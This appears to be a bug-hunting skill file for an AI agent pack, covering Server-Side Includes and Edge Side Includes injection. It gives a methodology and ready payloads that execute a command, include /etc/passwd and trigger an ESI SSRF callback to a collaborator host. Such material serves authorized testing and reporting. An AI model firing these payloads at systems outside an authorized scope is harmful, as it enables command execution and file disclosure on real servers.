---
skill: ssi-injection
title: "Server-Side Includes (SSI/ESI) Injection"
category: "Security · Web"
load_when: "ssi injection, server side includes, esi injection, edge side includes, #exec, #include virtual"
pack: SUPERAGENT V10
bughunt: true
---

# Server-Side Includes (SSI/ESI) Injection

## Where it pays
Legacy/edge servers that process SSI/ESI directives from user input → file read, SSRF, or command execution.

## Attack-surface signals
Apache/Nginx with SSI enabled (.shtml), CDN/edge with ESI (Varnish, Akamai, Fastly), pages reflecting input into cached HTML.

## Methodology
1. Inject SSI directives into reflected input; look for execution. 2. ESI: inject `<esi:include>` to SSRF internal URLs or bypass auth. 3. Command exec via `#exec` where allowed. 4. Confirm via OOB or reflected output.

## Payloads / probes
```
<!--#exec cmd="id" -->
<!--#include virtual="/etc/passwd" -->
<esi:include src="http://collab/"/>
<!--#echo var="DATE_LOCAL" -->
```

## Root causes
SSI/ESI processing of untrusted input; edge includes trusting upstream markup.

## Validation gate
Show a directive executing: command output, file include, or an ESI SSRF callback.

## Impact & chains
RCE, file read, SSRF, cache/auth bypass. Chains with web/ssrf and web/cache-poison.

## 🧪 Try it locally
```bash
python3 ../../../tools/skill_router.py "ssi injection, server side includes, esi injection, edge side includes, #exec, #include virtual"
```

→ Report with `../reporting/writeup.md` (CWE-97); validate with `../reporting/validation-gate.md`.
